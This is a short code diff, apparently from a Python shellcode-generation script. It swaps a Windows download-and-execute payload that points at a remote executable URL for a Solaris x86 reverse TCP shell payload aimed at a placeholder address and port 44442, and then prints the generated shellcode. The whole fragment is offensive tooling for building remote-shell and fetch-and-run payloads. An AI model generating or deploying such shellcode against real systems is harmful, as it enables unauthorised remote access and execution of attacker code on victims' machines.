@@ -8,9 +8,10 @@
 
 from generator import *
 
-qweqwe = "http://the.earth.li/~sgtatham/putty/latest/x86/psftp.exe" 
+i = "255.255.255.255"
+p = "44442" 
 
-shellcode = generator( "windows", "downloadandexecute", qweqwe)
+shellcode = generator( "solarisx86", "reverse_tcp", i, p)
 
 print shellcode
 
